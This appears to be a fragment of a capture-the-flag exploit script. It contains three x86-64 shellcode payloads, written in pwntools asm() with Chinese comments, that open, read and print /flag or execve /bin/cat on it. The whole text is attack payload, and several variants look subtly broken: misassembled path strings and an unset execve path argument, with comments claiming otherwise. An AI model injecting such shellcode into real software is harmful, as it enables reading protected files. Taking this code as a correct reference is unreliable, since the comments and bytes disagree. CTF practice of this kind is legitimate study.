shellcode = asm('''
    xor rax, rax
    push 0x67616c66
    push 0x2f
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov al, 2
    syscall

    mov rdi, rax
    mov rsi, rsp
    xor rdx, rdx
    mov dl, 0xff
    inc rdx
    xor rax, rax
    syscall

    xor rdi, rdi
    inc rdi
    xor rax, rax
    inc rax
    syscall

    xor rdi, rdi
    mov al, 60
    syscall
''')

# 生成shellcode
shellcode = asm('''
    xor rax, rax               /* 清空 rax */
    mov al, 0x2f               /* al = '/' */
    shl rax, 8
    add al, 0x66               /* al = 'f' */
    shl rax, 8
    add al, 0x6c               /* al = 'l' */
    shl rax, 8
    add al, 0x61               /* al = 'a' */
    shl rax, 8
    add al, 0x67               /* al = 'g' */
    push rax                   /* 压入 "/flag" */
    mov rdi, rsp               /* rdi = "/flag" 的地址 */

    /* open("/flag", O_RDONLY) */
    xor rsi, rsi               /* rsi = 0 (flags) */
    xor rdx, rdx               /* rdx = 0 */
    mov al, 2                  /* 系统调用号 2 (sys_open) */
    syscall

    /* read(fd, buf, 256) */
    mov rdi, rax               /* rdi = 文件描述符 */
    mov rsi, rsp               /* rsi = 缓冲区地址 */
    xor rdx, rdx               /* 清空 rdx */
    mov dl, 0xff               /* rdx = 255 */
    xor rax, rax               /* 系统调用号 0 (sys_read) */
    syscall

    /* write(1, buf, nbytes) */
    xor rdi, rdi               /* 清空 rdi */
    inc rdi                    /* rdi = 1 (stdout) */
    xor rax, rax
    inc rax                    /* rax = 1 (sys_write) */
    syscall

    /* exit(0) */
    xor rdi, rdi               /* rdi = 0 */
    mov al, 60                 /* 系统调用号 60 (sys_exit) */
    syscall
''')

""" shellcode = asm('''
    /* 生成 "/bin/cat" */
    xor rax, rax               /* 清空 rax */
    mov al, 0x74               /* al = 't' */
    shl rax, 8
    add al, 0x61               /* al = 'a' */
    shl rax, 8
    add al, 0x63               /* al = 'c' */
    shl rax, 8
    add al, 0x2f               /* al = '/' */
    push rax                   /* 压入 "cat/" */

    /* 生成 "/flag" */
    xor rax, rax
    mov al, 0x2f               /* al = '/' */
    shl rax, 8
    add al, 0x66               /* al = 'f' */
    shl rax, 8
    add al, 0x6c               /* al = 'l' */
    shl rax, 8
    add al, 0x61               /* al = 'a' */
    shl rax, 8
    add al, 0x67               /* al = 'g' */
    push rax                   /* 压入 "/flag" */
    mov rsi, rsp               /* rsi 指向 "/flag" */

    /* 准备参数 */
    xor rax, rax
    push rax                   /* NULL 终止符 */
    push rsi                   /* 压入参数 "/flag" */
    push rdi                   /* 压入参数 "/bin/cat" */
    mov rsi, rsp               /* rsi 指向参数数组 */

    /* 调用 execve("/bin/cat", ["/bin/cat", "/flag"], NULL) */
    xor rax, rax
    mov al, 0x3b               /* 系统调用号 59 (sys_execve) */
    xor rdx, rdx               /* rdx = NULL */
    syscall
''') """